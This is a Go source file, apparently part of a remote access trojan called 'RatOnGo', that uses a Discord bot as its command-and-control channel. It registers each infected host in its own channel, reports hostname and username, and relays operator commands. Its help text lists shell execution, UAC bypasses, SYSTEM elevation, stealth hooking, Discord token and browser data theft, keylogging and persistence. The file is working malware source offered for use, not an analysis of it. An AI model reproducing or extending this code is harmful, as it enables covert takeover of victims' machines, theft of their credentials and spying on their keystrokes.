package bot

import (
	"RatOnGo/internal/handlers"
	"context"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

const (
	MaxMessageLength = 1900
	MessageDelay     = 500 * time.Millisecond
	CommandPrefix    = "!"
	MaxRetryDelay    = 5 * time.Minute
)

type Client struct {
	session    *discordgo.Session
	channelID  string
	guildID    string
	handlers   *handlers.Manager
	mu         sync.RWMutex
	active     bool
	retryCount int
}

func NewClient(token, guildID string) (*Client, error) {
	session, err := discordgo.New("Bot " + token)
	if err != nil {
		return nil, err
	}

	return &Client{
		session:    session,
		guildID:    guildID,
		handlers:   handlers.NewManager(),
		active:     true,
		retryCount: 0,
	}, nil
}

// PRINT ONLY FOR DEBUG !!
func (c *Client) Start(ctx context.Context) error {
	if err := c.waitForInternetWithExponentialBackoff(); err != nil {
		return fmt.Errorf("no connection could be established: %v", err)
	}

	c.session.AddHandlerOnce(c.onReady)
	c.session.AddHandler(c.onMessage)
	c.session.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuilds

	if err := c.session.Open(); err != nil {
		go c.handleConnectionLoss()
		return err
	}

	go c.monitorConnection(ctx)

	<-ctx.Done()
	return c.session.Close()
}

func (c *Client) waitForInternetWithExponentialBackoff() error {
	baseDelay := 1 * time.Second
	maxDelay := MaxRetryDelay
	currentDelay := baseDelay

	fmt.Printf("waiting for wifi conection\n")

	for {
		if c.checkInternetConnectivity() {
			fmt.Printf("wifi connection established after %d attempts\n", c.retryCount)
			return nil
		}

		fmt.Printf("no connection (attempt %d). Retrying on%v...\n",
			c.retryCount+1, currentDelay)

		time.Sleep(currentDelay)

		currentDelay *= 2
		if currentDelay > maxDelay {
			currentDelay = maxDelay
		}

		c.retryCount++
	}
}

func (c *Client) checkInternetConnectivity() bool {
	client := &http.Client{Timeout: 10 * time.Second}

	urls := []string{
		"https://discord.com",
		"https://google.com",
		"https://cloudflare.com",
		"https://1.1.1.1",
	}

	for _, url := range urls {
		resp, err := client.Get(url)
		if err == nil {
			resp.Body.Close()
			return true
		}
	}

	return false
}

func (c *Client) monitorConnection(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if !c.checkInternetConnectivity() || (c.session != nil && !c.session.DataReady) {
				fmt.Println("loss conection, reconecting")
				go c.handleConnectionLoss()
			}
		}
	}
}

func (c *Client) handleConnectionLoss() {
	c.mu.Lock()
	defer c.mu.Unlock()

	if !c.active {
		return
	}

	if c.session != nil {
		c.session.Close()
	}

	fmt.Println("Reconecting...")

	if err := c.waitForInternetWithExponentialBackoff(); err != nil {
		fmt.Printf("Unable to reconnect: %v\n", err)
		return
	}

	token := ""
	if c.session != nil {
		token = strings.TrimPrefix(c.session.Token, "Bot ")
	}

	if token == "" {
		fmt.Println("Could not obtain reconnection token")
		return
	}

	newSession, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Printf("Error recreating session: %v\n", err)
		return
	}

	c.session = newSession
	c.session.AddHandlerOnce(c.onReady)
	c.session.AddHandler(c.onMessage)
	c.session.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuilds

	if err := c.session.Open(); err != nil {
		fmt.Printf("Error reopening connection: %v\n", err)
		time.Sleep(30 * time.Second)
		go c.handleConnectionLoss()
		return
	}

	fmt.Println("Successful reconnection")
}

func (c *Client) onReady(s *discordgo.Session, r *discordgo.Ready) {
	if err := c.setupChannel(); err != nil {
		c.Shutdown()
		return
	}

	go func() {
		if result := c.handlers.EnsurePersistence(); result != "" {
			c.sendMessage("✅ System initialized")
		}
	}()

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	helpMsg := c.buildHelpMessage()
	c.sendMessage(helpMsg)

	msg := fmt.Sprintf("🟢 **Session Active**\n```\nHost: %s\nUser: %s\nReady for commands\n```",
		hostname, username)
	c.sendMessage(msg)
}

func (c *Client) buildHelpMessage() string {
	return `**Available Commands:**

**System:**
• !cmd <command> - Execute Windows command
• !shell <command> - Execute PowerShell command
• !screen - Take screenshot
• !privs, !whoami - Check current privileges

**Privilege Escalation:**
• !admin [method] - Bypass UAC (user → admin)
  └─ Methods: fodhelper, eventvwr, sdclt, computerdefaults
• !system [method] - Elevate to SYSTEM (admin → system)
  └─ Methods: pipe, token, task

**Stealth & Evasion:**
• !hide [method] - Activate stealth features
  └─ Methods: peb, hook, spoof, all, status
• !stealth - Check stealth status

**Data Collection:**
• !tokens, !tokengrab - Grab Discord tokens
• !browser, !browserdata - Steal browser data

**Monitoring:**
• !keylogger <start/stop/status> - Start/stop keylogger
• !keys, !keylogs - Dump captured keystrokes

**Persistence:**
• !persist, !persistence - Ensure persistence

**Control:**
• !exit, !kill - Self-destruct and cleanup

**Examples:**
• !admin fodhelper - Try only fodhelper UAC bypass
• !system pipe - Try only named pipe elevation
• !hide peb - Only activate PEB hiding
• !hide all - Activate all stealth methods
• !keylogger start - Start keylogging
• !keylogs - Download captured keystrokes`
}

func (c *Client) setupChannel() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	channelName := fmt.Sprintf("sys-%s-%s",
		strings.ToLower(hostname[:min(len(hostname), 8)]),
		strings.ToLower(username[:min(len(username), 6)]))

	ch, err := c.session.GuildChannelCreate(c.guildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		return err
	}

	c.channelID = ch.ID
	return nil
}

func (c *Client) onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !c.active || m.Author.ID == s.State.User.ID || m.ChannelID != c.channelID {
		return
	}

	if !strings.HasPrefix(m.Content, CommandPrefix) {
		return
	}

	parts := strings.Fields(m.Content)
	if len(parts) == 0 {
		return
	}

	command := strings.TrimPrefix(parts[0], CommandPrefix)
	args := parts[1:]

	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()

		result := c.handlers.Execute(ctx, command, args, c.session, c.channelID)
		if result != "" {
			c.sendMessage(result)
		}
	}()
}

func (c *Client) sendMessage(content string) {
	if !c.active || content == "" {
		return
	}

	c.mu.Lock()
	defer c.mu.Unlock()

	if c.session == nil {
		return
	}

	formatted := "```\n" + content + "\n```"

	if len(formatted) <= MaxMessageLength {
		c.session.ChannelMessageSend(c.channelID, formatted)
		return
	}

	chunks := c.splitMessage(content, MaxMessageLength-10)
	for i, chunk := range chunks {
		if i > 0 {
			time.Sleep(MessageDelay)
		}
		c.session.ChannelMessageSend(c.channelID, "```\n"+chunk+"\n```")
	}
}

func (c *Client) splitMessage(content string, maxLen int) []string {
	var chunks []string
	for len(content) > maxLen {
		splitAt := maxLen
		if splitAt > len(content) {
			splitAt = len(content)
		}
		chunks = append(chunks, content[:splitAt])
		content = content[splitAt:]
	}
	if len(content) > 0 {
		chunks = append(chunks, content)
	}
	return chunks
}

func (c *Client) Shutdown() {
	c.mu.Lock()
	c.active = false
	c.mu.Unlock()

	if c.session != nil {
		c.session.Close()
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

